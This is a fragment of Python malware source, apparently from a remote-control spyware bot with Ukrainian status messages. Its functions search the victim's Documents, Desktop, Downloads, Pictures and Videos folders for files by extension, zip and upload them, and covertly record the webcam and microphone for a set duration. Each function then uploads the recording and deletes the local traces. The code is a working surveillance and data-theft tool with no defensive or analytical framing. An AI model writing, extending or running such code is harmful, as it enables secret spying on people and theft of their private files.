def file_search(ext):
    folders = [
        os.path.expandvars(r"%USERPROFILE%\Documents"),
        os.path.expandvars(r"%USERPROFILE%\Desktop"),
        os.path.expandvars(r"%USERPROFILE%\Downloads"),
        os.path.expandvars(r"%USERPROFILE%\Pictures"),
        os.path.expandvars(r"%USERPROFILE%\Videos")
    ]
    found = []
    for folder in folders:
        if os.path.exists(folder):
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if file.lower().endswith(ext.lower()):
                        found.append(os.path.join(root, file))
    if found:
        zip_name = f"files_{ext[1:]}.zip"
        with zipfile.ZipFile(zip_name, 'w') as z:
            for f in found[:100]:
                try:
                    z.write(f, os.path.basename(f))
                except:
                    pass
        send_file(zip_name)
        os.remove(zip_name)
        return f"✅ Знайдено {len(found)} файлів з розширенням {ext}"
    else:
        return f"❌ Файли з {ext} не знайдено"

def webcam_video(duration):
    if ensure_module('cv2', 'opencv-python'):
        import cv2
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "❌ Вебкамера не знайдена"
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('cam_video.avi', fourcc, 20.0, (640,480))
            start = time.time()
            while time.time() - start < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break
            cap.release()
            out.release()
            send_file('cam_video.avi')
            os.remove('cam_video.avi')
            return f"✅ Відео з вебкамери ({duration} сек)"
        except Exception as e:
            return f"❌ Помилка: {e}"
    else:
        return "❌ Не вдалося встановити OpenCV"

def mic_record(duration):
    if ensure_module('pyaudio', 'PyAudio'):
        import pyaudio
        import wave
        try:
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            wf = wave.open('mic.wav', 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            send_file('mic.wav')
            os.remove('mic.wav')
            return f"✅ Аудіо з мікрофона ({duration} сек)"
        except Exception as e:
            return f"❌ Помилка: {e}"
    else:
        return "❌ Не вдалося встановити PyAudio"

